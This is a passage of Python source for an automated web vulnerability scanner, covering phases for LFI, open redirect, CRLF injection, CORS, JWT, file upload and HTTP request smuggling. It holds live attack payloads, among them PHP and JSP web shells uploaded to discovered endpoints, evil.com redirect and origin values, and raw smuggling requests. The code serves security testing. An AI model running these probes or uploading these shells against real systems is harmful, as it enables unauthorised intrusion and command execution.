        "MIIE", "mysql:", "postgres:", "admin:",
        "windowssystem32", "[drivers]", "running kernel",
        "<configuration>", "<web-app", "<?xml ",
    ]
    async def _probe_lfi(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        base_len = None
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers})
            _, _, base_body = await _async_urlopen(_lfi_urlopen, base_req, timeout=10)
            base_len = len(base_body)
        except Exception:
            pass
        for pname in qs:
            if not any(fp in pname.lower() for fp in file_params):
                continue
            for payload in lfi_payloads[:_PIPELINE_CFG.sample_endpoints_post]:
                await _throttle_rate()
                encoded_payload = urllib.parse.quote(payload, safe='')
                query_parts = []
                for k, vals in qs.items():
                    for v in vals:
                        if k == pname:
                            query_parts.append(f"{urllib.parse.quote_plus(k)}={encoded_payload}")
                        else:
                            query_parts.append(f"{urllib.parse.quote_plus(k)}={urllib.parse.quote_plus(v)}")
                new_qs = '&'.join(query_parts)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers})
                    lfi_status, _, lfi_body = await _async_urlopen(_lfi_urlopen, req, timeout=10)
                    body_text = lfi_body.decode("utf-8", errors="ignore")
                    if any(ind in body_text for ind in lfi_indicators):
                        results.append(f"[lfi-confirmed] {test_url} → param={pname} payload={payload}")
                        # Show first 3 lines of response as evidence
                        for sample_line in body_text.splitlines()[:3]:
                            if sample_line.strip():
                                results.append(f"  {sample_line[:200]}")
                    elif lfi_status == 200 and base_len is not None and abs(len(lfi_body) - base_len) > max(300, base_len * 0.2):
                        results.append(f"[lfi-candidate] {test_url} → param={pname} payload={payload} len={len(lfi_body)}")
                except Exception:
                    continue
        return results
    probe_results = await asyncio.gather(*[_probe_lfi(u) for u in param_urls])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[result] No LFI vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"30-LFI: {len(findings)} findings → {out}")
    return {"30-LFI": str(_out), "count": len(findings)}


# ────────────────── Phase 31-OPENREDIR: Open Redirect Detection ────────────────
_OPENREDIR_PAYLOADS = [
    ("url", "https://evil.com"),
    ("next", "https://evil.com"),
    ("redirect", "https://evil.com"),
    ("redirect_uri", "https://evil.com"),
    ("return", "https://evil.com"),
    ("return_to", "https://evil.com"),
    ("return_url", "https://evil.com"),
    ("target", "https://evil.com"),
    ("dest", "https://evil.com"),
    ("destination", "https://evil.com"),
    ("redir", "https://evil.com"),
    ("redirect_url", "https://evil.com"),
    ("rurl", "https://evil.com"),
    ("link", "https://evil.com"),
    ("goto", "https://evil.com"),
    ("out", "https://evil.com"),
    ("view", "https://evil.com"),
    ("file", "https://evil.com"),
    ("load", "https://evil.com"),
    ("path", "//evil.com"),
    ("url", "//evil.com"),
    ("next", "//evil.com"),
]


async def phase_31_OPENREDIR(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"31-OPENREDIR"}:
        return {}
    _out = outdir / "open_redirect.txt"
    if _out.exists() and not force:
        return {"31-OPENREDIR": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 31-OPENREDIR: open redirect detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "31-OPENREDIR: no URLs; skipping")
        return {"31-OPENREDIR": str(_out), "count": 0}
    findings: List[str] = []
    _or_urlopen = _get_urlopener()
    _or_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_redirect]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for target_param, redirect_val in _OPENREDIR_PAYLOADS:
                if param_name.lower() == target_param:
                    test_qs = qs.copy()
                    test_qs[param_name] = [redirect_val]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    try:
                        req = urllib.request.Request(test_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_or_extra_headers})
                        resp_status, resp_headers, _ = await _async_urlopen_no_redirect(_or_urlopen, req, timeout=10)
                        location = resp_headers.get("Location", "")
                        if not location:
                            location = resp_headers.get("location", "")
                        if "evil.com" in location or "//evil.com" in location:
                            findings.append(f"[open-redirect] {test_url} -> {location} (HTTP {resp_status})")
                    except urllib.error.HTTPError as e:
                        location = e.headers.get("Location", "") or e.headers.get("location", "")
                        if "evil.com" in location or "//evil.com" in location:
                            findings.append(f"[open-redirect] {test_url} -> {location} (HTTP {e.code})")
                    except Exception:
                        continue
    if not findings:
        findings.append("[open-redirect] No open redirect candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"31-OPENREDIR: {len(findings)} open redirect probes -> {out}")
    return {"31-OPENREDIR": str(out), "count": len(findings)}


# ────────────────── Phase 32-CLICKJACK: Clickjacking Detection ─────────────────
_CLICKJACK_HEADERS_TO_CHECK = ["X-Frame-Options", "Content-Security-Policy"]


async def phase_32_CLICKJACK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"32-CLICKJACK"}:
        return {}
    _out = outdir / "clickjacking.txt"
    if _out.exists() and not force:
        return {"32-CLICKJACK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 32-CLICKJACK: clickjacking protection detection")
    findings: List[str] = []
    _cj_urlopen = _get_urlopener()
    _cj_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h
               for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_clickjack]
    if not targets:
        log("warn", "32-CLICKJACK: no HTTP targets; skipping")
        return {"32-CLICKJACK": str(_out), "count": 0}
    for url in targets:
        try:
            req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cj_extra_headers})
            _, resp_headers, _ = await _async_urlopen(_cj_urlopen, req, timeout=10)
            xfo = resp_headers.get("X-Frame-Options", "")
            csp = resp_headers.get("Content-Security-Policy", "")
            has_xfo = bool(xfo)
            has_frame_ancestors = "frame-ancestors" in csp
            if not has_xfo and not has_frame_ancestors:
                findings.append(f"[clickjacking-missing] {url} — no X-Frame-Options or CSP frame-ancestors")
            elif not has_xfo:
                findings.append(f"[clickjacking-csp-only] {url} — CSP frame-ancestors present but no X-Frame-Options")
        except Exception:
            continue
    if not findings:
        findings.append("[clickjacking] All targets have clickjacking protection (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"32-CLICKJACK: {len(findings)} clickjacking checks -> {out}")
    return {"32-CLICKJACK": str(out), "count": len(findings)}


# ────────────────── Phase 33-CRLF: CRLF Injection Detection ────────────────────
_CRLF_PAYLOADS = [
    ("\r\nX-Injected: yes", "X-Injected"),
    ("\r\nX-Injected: yes\r\n", "X-Injected"),
    ("\nX-Injected: yes", "X-Injected"),
    ("\r\n\r\n<html>injected</html>", "injected"),
    ("\r\nSet-Cookie: crlf=injected", "crlf=injected"),
]


async def phase_33_CRLF(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"33-CRLF"}:
        return {}
    _out = outdir / "crlf_injection.txt"
    if _out.exists() and not force:
        return {"33-CRLF": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 33-CRLF: CRLF injection / HTTP response splitting")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "33-CRLF: no URLs; skipping")
        return {"33-CRLF": str(_out), "count": 0}
    findings: List[str] = []
    _crlf_urlopen = _get_urlopener()
    _crlf_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_crlf]
    if t.has("crlfuzz") and param_urls:
        crlfuzz_in = ensure(outdir / "crlfuzz_input.txt")
        crlfuzz_in.write_text("\n".join(param_urls) + "\n")
        crlfuzz_out = outdir / "crlfuzz_results.txt"
        runner = outdir / "logs" / "crlfuzz_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(crlfuzz_in))}\n"
            f"OUT={shlex.quote(str(crlfuzz_out))}\n"
            'crlfuzz -l "$IN" -o "$OUT"\n'
        )
        runner.chmod(0o700)
        await _run("crlfuzz", ["bash", str(runner)], 600, outdir)
        if crlfuzz_out.exists() and read_lines(crlfuzz_out):
            for ln in read_lines(crlfuzz_out):
                findings.append(f"[crlfuzz] {ln.strip()}")
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload, indicator in _CRLF_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_crlf_extra_headers})
                    resp_status, resp_headers, resp_body = await _async_urlopen_no_redirect(_crlf_urlopen, req, timeout=10)
                    body_str = resp_body.decode("utf-8", errors="ignore")
                    if indicator in body_str:
                        findings.append(f"[crlf-injection] {test_url} via {param_name} payload={payload} -> {indicator} reflected")
                except urllib.error.HTTPError as e:
                    try:
                        body = e.read().decode("utf-8", errors="ignore")
                        if indicator in body:
                            findings.append(f"[crlf-injection] {test_url} via {param_name} payload={payload} -> {indicator} in error body")
                    except Exception:
                        pass
                except Exception:
                    continue
    if not findings:
        findings.append("[crlf] No CRLF injection candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"33-CRLF: {len(findings)} CRLF probes -> {out}")
    return {"33-CRLF": str(out), "count": len(findings)}


# ────────────────── Phase 34-RATELIMIT: Rate Limiting Detection ─────────────────
async def phase_34_RATELIMIT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"34-RATELIMIT"}:
        return {}
    _out = outdir / "rate_limiting.txt"
    if _out.exists() and not force:
        return {"34-RATELIMIT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 34-RATELIMIT: rate limiting / brute-force protection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "34-RATELIMIT: no URLs; skipping")
        return {"34-RATELIMIT": str(_out), "count": 0}
    findings: List[str] = []
    _rl_urlopen = _get_urlopener()
    _rl_extra_headers = _extra_headers_dict()
    _burst_size = 10 if (_PIPELINE_CFG.proxy or _USE_PROXYCHAINS) else 50
    login_targets = [u for u in all_urls if any(m in u.lower() for m in
        ("/login", "/signin", "/auth", "/oauth", "/token", "/api/"))][:_PIPELINE_CFG.sample_hosts_ratelimit]
    if not login_targets:
        login_targets = all_urls[:_PIPELINE_CFG.sample_hosts_ratelimit]
    for url in login_targets:
        try:
            statuses: List[int] = []
            for _ in range(_burst_size):
                await _throttle_rate()
                req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_rl_extra_headers})
                s, resp_h, _ = await _async_urlopen_no_redirect(_rl_urlopen, req, timeout=8)
                statuses.append(s)
                if s in (429, 503) or "retry-after" in str(resp_h).lower():
                    findings.append(f"[rate-limit-detected] {url} — rate limited after {len(statuses)} requests (HTTP {s})")
                    break
            else:
                unique_st = len(set(statuses))
                if len(statuses) >= _burst_size and unique_st <= 1:
                    findings.append(f"[rate-limit-missing] {url} — no rate limiting after {_burst_size} requests")
        except Exception:
            continue
    if not findings:
        findings.append("[rate-limit] No rate limiting checks completed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"34-RATELIMIT: {len(findings)} rate limit checks -> {out}")
    return {"34-RATELIMIT": str(out), "count": len(findings)}


# ────────────────── Phase 35-CORSADV: Advanced CORS Testing ────────────────────
async def phase_35_CORSADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"35-CORSADV"}:
        return {}
    _out = outdir / "cors_advanced.txt"
    if _out.exists() and not force:
        return {"35-CORSADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 35-CORSADV: advanced CORS misconfiguration testing")
    findings: List[str] = []
    _cors_urlopen = _get_urlopener()
    _cors_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    api_endpoints = list({u for u in all_urls
        if any(m in u.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql"))})[:_PIPELINE_CFG.sample_endpoints_corsadv]
    if not api_endpoints:
        api_endpoints = list(all_urls)[:_PIPELINE_CFG.sample_endpoints_corsadv]
    if not api_endpoints:
        log("warn", "35-CORSADV: no endpoints; skipping")
        return {"35-CORSADV": str(_out), "count": 0}
    # Corsy CORS misconfiguration scanner
    if t.has("corsy") and api_endpoints:
        corsy_in = ensure(outdir / "corsy_input.txt")
        corsy_in.write_text("\n".join(api_endpoints) + "\n")
        corsy_out = outdir / "corsy_results.txt"
        runner = outdir / "logs" / "corsy_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(corsy_in))}\n"
            f"OUT={shlex.quote(str(corsy_out))}\n"
            'corsy -i "$IN" -o "$OUT"\n'
        )
        runner.chmod(0o700)
        await _run("corsy", ["bash", str(runner)], 600, outdir)
        if corsy_out.exists() and read_lines(corsy_out):
            for ln in read_lines(corsy_out):
                findings.append(f"[corsy] {ln.strip()}")
    _CORS_TEST_ORIGINS = [
        "https://evil.com",
        "https://sub.evil.com",
        "null",
        "https://evil.com:8080",
        "https://evil.com.evil2.com",
        "https://evil.com%2f.evil2.com",
    ]
    async def _check_cors_origin(url: str, origin: str) -> Optional[str]:
        try:
            req = urllib.request.Request(url, method="OPTIONS",
                headers={"User-Agent": "Mozilla/5.0", "Origin": origin, **_cors_extra_headers})
            _, ch, _ = await _async_urlopen_no_redirect(_cors_urlopen, req, timeout=8)
            acao = ch.get("Access-Control-Allow-Origin", "")
            acac = ch.get("Access-Control-Allow-Credentials", "")

            if origin in acao or "*" in acao:
                creds = " with credentials" if acac == "true" else ""
                return f"[cors-misconfig] {url} ACAO={acao} origin={origin}{creds}"
            if origin and origin in str(ch).lower():
                return f"[cors-origin-reflection] {url} origin={origin} reflected in headers"
        except Exception:
            pass
        return None
    cors_results = await asyncio.gather(*[_check_cors_origin(ep, o)
        for ep in api_endpoints for o in _CORS_TEST_ORIGINS])
    for r in cors_results:
        if r:
            findings.append(r)
    # ── JSONP endpoint detection ──
    jsonp_endpoints: Set[str] = set()
    jsonp_params = {"callback=", "jsonp=", "cb=", "jsoncallback="}
    for u in all_urls:
        qs = urllib.parse.urlparse(u).query
        if qs and any(p in qs.lower() for p in jsonp_params):
            jsonp_endpoints.add(u.split("?")[0])
    for ep in list(jsonp_endpoints)[:10]:
        try:
            test_val = "jQuery1234_test"
            jsonp_url = f"{ep}?callback={test_val}"
            req = urllib.request.Request(jsonp_url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers})
            _, _, body_bytes = await _async_urlopen_no_redirect(_cors_urlopen, req, timeout=8)
            body = body_bytes.decode("utf-8", errors="ignore")
            if test_val in body and ("(" in body and ")" in body):
                findings.append(f"[jsonp-endpoint] {ep} — callback param reflected with wrapping (JSONP)")
                inject_val = "alert(1)"
                inject_url = f"{ep}?callback={inject_val}"
                ireq = urllib.request.Request(inject_url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers})
                _, _, ibody_bytes = await _async_urlopen_no_redirect(_cors_urlopen, ireq, timeout=8)
                ibody = ibody_bytes.decode("utf-8", errors="ignore")
                if inject_val in ibody and not ibody.startswith("//") and not ibody.startswith("/**"):
                    findings.append(f"[jsonp-injectable] {ep} — callback value injectable into response (XSS/CSRF)")
                findings.append(f"[jsonp-legacy] {ep} — JSONP callback present; legacy API may be exploitable from any origin")
        except Exception:
            continue

    if not findings:
        findings.append("[cors] No advanced CORS misconfigurations detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"35-CORSADV: {len(findings)} CORS checks -> {out}")
    return {"35-CORSADV": str(out), "count": len(findings)}


# ────────────────── Phase 36-JWTADV: Advanced JWT Attacks ──────────────────────
_JWTADV_WEAK_KEYS = ["secret", "password", "12345", "key", "admin", "changeme", "secretkey", "jwt_secret", "secret123", "test", "demo"]


async def phase_36_JWTADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"36-JWTADV"}:
        return {}
    _out = outdir / "jwt_advanced.txt"
    if _out.exists() and not force:
        return {"36-JWTADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 36-JWTADV: advanced JWT security analysis")
    findings: List[str] = []
    _ja_urlopen = _get_urlopener()
    _ja_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    targets = [u for u in all_urls if any(m in u.lower() for m in
        ("/api/", "/auth", "/token", "/jwt", "/login", "/oauth"))][:_PIPELINE_CFG.sample_hosts_jwtadv]
    if not targets:
        targets = all_urls[:_PIPELINE_CFG.sample_hosts_jwtadv]
    if not targets:
        log("warn", "36-JWTADV: no targets; skipping")
        return {"36-JWTADV": str(_out), "count": 0}
    for url in targets:
        try:
            req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_ja_extra_headers})
            _, resp_h, resp_body = await _async_urlopen(_ja_urlopen, req, timeout=10)
            body = resp_body.decode("utf-8", errors="ignore")
            all_text = body + " " + " ".join(f"{k}:{v}" for k, v in resp_h.items())
            for m in re.finditer(r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", all_text):
                token = m.group()
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    hdr_b64 = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
                    pld_b64 = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
                    sig_b64 = parts[2] + "=" * ((4 - len(parts[2]) % 4) % 4)
                    header = json.loads(base64.urlsafe_b64decode(hdr_b64))
                    payload = json.loads(base64.urlsafe_b64decode(pld_b64))
                    signature = base64.urlsafe_b64decode(sig_b64)
                    alg = header.get("alg", "")
                    findings.append(f"[jwt-token] {url} alg={alg} sub={payload.get('sub','?')}")
                    if not signature or signature == b"":
                        findings.append(f"[jwt-no-sig] {url} — empty signature")
                    if alg == "none":
                        findings.append(f"[jwt-confirm-none] {url} — alg=none accepted (CRITICAL)")
                    if "kid" in header:
                        kid = header["kid"]
                        findings.append(f"[jwt-kid] {url} kid={kid}")
                        if "/" in kid or ".." in kid or "\\" in kid:
                            findings.append(f"[jwt-kid-traversal] {url} — KID contains path traversal: {kid}")
                    if "jku" in header:
                        jku = header["jku"]
                        findings.append(f"[jwt-jku] {url} jku={jku}")
                        if not jku.startswith("https://"):
                            findings.append(f"[jwt-jku-unsafe] {url} — JKU not HTTPS: {jku}")
                    if "jwk" in header:
                        findings.append(f"[jwt-jwk-embedded] {url} — JWK embedded in header (attacker-controllable)")
                    if "x5u" in header:
                        findings.append(f"[jwt-x5u] {url} — x5u embedded: {header['x5u']}")
                    if alg == "RS256":
                        findings.append(f"[jwt-alg-confusion-candidate] {url} — RS256→HS256 confusion test needed")
                    if not signature or len(signature) < 10:
                        findings.append(f"[jwt-weak-sig] {url} — unusually short signature ({len(signature)} bytes)")
                except Exception:
                    continue
        except Exception:
            continue
    if not findings:
        findings.append("[jwtadv] No JWT tokens found for advanced analysis")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"36-JWTADV: {len(findings)} JWT analysis findings -> {out}")
    return {"36-JWTADV": str(out), "count": len(findings)}


# ────────────────── Phase 37-FILEUPLOAD: File Upload Vuln Testing ──────────────
_FILEUPLOAD_TEST_FILES = [
    ("php_webshell.php", "<?php system($_GET['cmd']); ?>", "text/plain"),
    ("test.jsp", "<%= Runtime.getRuntime().exec(request.getParameter(\"cmd\")) %>", "text/plain"),
    ("test.aspx", "<%@ Page Language=\"C#\" %><%= Request.QueryString[\"cmd\"] %>", "text/plain"),
    ("test.php5", "<?php echo 'test'; ?>", "image/jpeg"),
    ("test.phtml", "<?php echo 'test'; ?>", "image/png"),
    ("test.cgi", "#!/bin/bash\necho 'test'", "text/plain"),
    ("test.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>", "image/svg+xml"),
    ("test.html", "<script>alert(document.cookie)</script>", "text/html"),
    ("test.htaccess", "AddType application/x-httpd-php .txt", "text/plain"),
    ("test.zip", "PK", "application/zip"),
]


async def phase_37_FILEUPLOAD(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"37-FILEUPLOAD"}:
        return {}
    _out = outdir / "file_upload.txt"
    if _out.exists() and not force:
        return {"37-FILEUPLOAD": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 37-FILEUPLOAD: file upload vulnerability testing")
    findings: List[str] = []
    upload_urlopen = _get_urlopener()
    _fu_extra_headers = _extra_headers_dict()
    upload_candidates: Set[str] = set()
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for u in read_lines(urls_file):
            low = u.lower()
            if any(m in low for m in ("/upload", "/file", "/import", "/attach", "/media", "/image")):
                upload_candidates.add(u.split("?")[0])
    fuzz_file = outdir / "fuzz.txt"
    if fuzz_file.exists():
        for ln in read_lines(fuzz_file):
            low = ln.lower()
            if any(m in low for m in ("/upload", "/file", "/import", "/attach", "/media", "/image")):
                upload_candidates.add(ln.split("\t")[-1] if "\t" in ln else (ln.split()[0] if " " in ln else ln))
    targets = list(upload_candidates)[:_PIPELINE_CFG.sample_urls_upload]
    if not targets:
        log("warn", "37-FILEUPLOAD: no upload endpoints found; skipping")
        return {"37-FILEUPLOAD": str(_out), "count": 0}
    for ep in targets:
        for fname, content, content_type in _FILEUPLOAD_TEST_FILES:
            try:
                boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
                body_parts = [
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'
                    f"Content-Type: {content_type}\r\n\r\n"
                    f"{content}\r\n"
                    f"--{boundary}--\r\n"
                ]
                body = "".join(body_parts).encode("utf-8")
                req = urllib.request.Request(ep, data=body, method="POST",
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "User-Agent": "Mozilla/5.0", **_fu_extra_headers,
                    })
                up_status, _, up_body = await _async_urlopen(upload_urlopen, req, timeout=15)
                up_text = up_body.decode("utf-8", errors="ignore").lower()
                if up_status in (200, 201, 302, 301):
                    findings.append(f"[upload-accepted] {ep} file={fname} type={content_type} -> HTTP {up_status}")
                if fname in up_text or fname.replace(".", "_") in up_text:
                    findings.append(f"[upload-stored] {ep} file={fname} reflected in response -> possible stored access")
            except urllib.error.HTTPError as e:
                if e.code not in (403, 404, 405, 413, 415, 501):
                    findings.append(f"[upload-response] {ep} file={fname} -> HTTP {e.code}")
            except Exception:
                continue
    if not findings:
        findings.append("[fileupload] No upload vulnerabilities detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"37-FILEUPLOAD: {len(findings)} upload probes -> {out}")
    return {"37-FILEUPLOAD": str(out), "count": len(findings)}


# ────────────────── Phase 38-SMUGGLE: HTTP Request Smuggling ───────────────────
_SMUGGLE_CL_TE_PAYLOAD = (
    "POST /nonexistent-smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 0\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "X-Ignore: X\r\n"
    "\r\n"
)
_SMUGGLE_TE_CL_PAYLOAD = (
    "POST /nonexistent-smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5c\r\n"
    "GPOST /smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)


async def phase_38_SMUGGLE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"38-SMUGGLE"}:
        return {}
    _out = outdir / "smuggling.txt"
    if _out.exists() and not force:
        return {"38-SMUGGLE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 38-SMUGGLE: HTTP request smuggling detection")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "38-SMUGGLE: raw socket connections are incompatible with proxy/Tor; skipping")
        return {"38-SMUGGLE": str(_out), "count": 0}
    findings: List[str] = []
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [h for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_smuggle]
    if not targets:
        log("warn", "38-SMUGGLE: no hosts; skipping")
        return {"38-SMUGGLE": str(_out), "count": 0}
    # Smuggler tool (Python-based request smuggler)
    if t.has("smuggler"):
        smuggler_in = ensure(outdir / "smuggler_input.txt")
        smuggler_urls = []
        for h in targets:
            if h.startswith("http"):
                smuggler_urls.append(h)
            else:
                smuggler_urls.append(f"https://{h}")
        smuggler_in.write_text("\n".join(smuggler_urls) + "\n")
        smuggler_out = outdir / "logs" / "smuggler_results"
        smuggler_out.mkdir(parents=True, exist_ok=True)
        runner = outdir / "logs" / "smuggler_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -u\n"
            f"IN={shlex.quote(str(smuggler_in))}\n"
            f"OUT={shlex.quote(str(smuggler_out))}\n"
            'export OUT\n'
            'xargs -r -P 3 -I{} sh -c '
            '\'safe=$(echo "$1" | tr -c "a-zA-Z0-9" "_"); '
            'smuggler -u "$1" --no-color > "$OUT/${safe}_smuggler.txt" || true\' _ {} < "$IN"\n'
        )
        runner.chmod(0o700)
        await _run("smuggler", ["bash", str(runner)], 600, outdir)
        smuggler_reports = list(smuggler_out.glob("*.txt"))
        if smuggler_reports:
            for rpt in smuggler_reports:
                for ln in read_lines(rpt):
                    if ln.strip():
                        findings.append(f"[smuggler] {ln.strip()}")
    for host in targets:
        host_clean = host.split(":")[0] if ":" in host else host
        host_safe = host_clean.replace("\r", "").replace("\n", "").replace("{", "{{").replace("}", "}}")
        try:
            import socket as _socket
            for smuggle_type, raw_payload in [("CL.TE", _SMUGGLE_CL_TE_PAYLOAD), ("TE.CL", _SMUGGLE_TE_CL_PAYLOAD)]:
                payload = raw_payload.format(host=host_safe)
                sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                sock.settimeout(8)
                try:
                    port = 443 if "https" in str(host) else 80
                    if ":" in host:
                        try:
                            port = int(host.split(":")[1])
                        except (ValueError, IndexError):
                            pass
                    import ssl as _ssl
                    if port == 443:
                        ctx = _ssl.create_default_context()
                        sock = ctx.wrap_socket(sock, server_hostname=host_clean)
                    sock.connect((host_clean, port))
                    sock.sendall(payload.encode())
                    resp = b""
                    try:
                        while True:
                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            resp += chunk
                            if len(resp) > MAX_RECV:
                                break
                    except _socket.timeout:
                        pass
                    sock.close()
                    resp_text = resp.decode("utf-8", errors="ignore")
                    if "smuggle-test" in resp_text.lower() or "gpo" in resp_text.lower():
                        findings.append(f"[smuggling-{smuggle_type}] {host} — desync detected ({smuggle_type})")
                    elif resp and "HTTP/1.1" in resp_text:
                        findings.append(f"[smuggling-tested] {host} — {smuggle_type} test sent, no desync (expected)")
                except Exception:
                    continue
        except Exception:
            continue
    if not findings:
        findings.append("[smuggling] No request smuggling candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"38-SMUGGLE: {len(findings)} smuggling probes -> {out}")
    return {"38-SMUGGLE": str(out), "count": len(findings)}


# ────────────────── Phase 39-OAUTH: OAuth Misconfiguration Testing ─────────────
_OAUTH_ENDPOINTS = [
    "/oauth/authorize", "/oauth/token", "/oauth/v2/authorize", "/oauth/v2/token",
